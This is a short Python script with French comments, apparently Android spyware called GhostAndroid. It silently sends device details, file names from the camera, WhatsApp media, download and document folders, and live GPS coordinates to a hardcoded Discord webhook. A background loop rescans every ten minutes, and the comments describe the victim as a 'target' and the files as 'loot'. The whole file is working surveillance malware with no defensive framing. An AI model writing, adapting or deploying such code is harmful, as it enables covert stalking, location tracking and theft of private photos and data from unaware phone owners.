import os, time, requests, platform, threading
from plyer import gps, notification

# Configuration du Tableau de Bord [cite: 2025-08-28]
WEBHOOK = "https://discord.com/api/webhooks/1458535419137232949/MKU4TuPKTlBQGhF3NWtRZ_lxnx7m9DqUnINvZKd1KJWmITYTZqCPyjayKNs9o1HLcyRR"

def send_data(msg):
    try: requests.post(WEBHOOK, json={"content": msg}, timeout=10)
    except: pass

class GhostAndroid:
    def __init__(self):
        self.loot_path = "/sdcard/"
        self.targets = ["DCIM/Camera", "WhatsApp/Media", "Download", "Documents"]

    def stealth_info(self):
        # Récupère l'identité complète de l'appareil [cite: 2025-08-28]
        info = f"👤 **NOUVELLE CIBLE ANDROID**\nModèle: {platform.machine()}\nVersion: {platform.release()}"
        send_data(info)

    def file_scanner(self):
        # Scan silencieux des fichiers précieux [cite: 2025-08-28]
        for t in self.targets:
            full_path = os.path.join(self.loot_path, t)
            if os.path.exists(full_path):
                files = os.listdir(full_path)[:10] # Liste les 10 derniers fichiers
                send_data(f"📂 **LOOT {t}** : {files}")

    def track_gps(self):
        # Traçage GPS sans éveiller de soupçons [cite: 2025-08-28]
        try:
            gps.configure(on_location=lambda **k: send_data(f"📍 **GPS** : {k.get('lat')}, {k.get('lon')}"))
            gps.start()
        except: pass

    def persistence(self):
        # Boucle infinie en thread séparé pour ne pas bloquer l'app [cite: 2025-08-28]
        while True:
            # Vérifie si de nouvelles photos ont été prises toutes les 10 minutes [cite: 2025-08-28]
            self.file_scanner()
            time.sleep(600)

if __name__ == "__main__":
    spy = GhostAndroid()
    spy.stealth_info()
    # Lancement des modules en arrière-plan [cite: 2025-08-28]
    threading.Thread(target=spy.persistence, daemon=True).start()
    spy.track_gps()
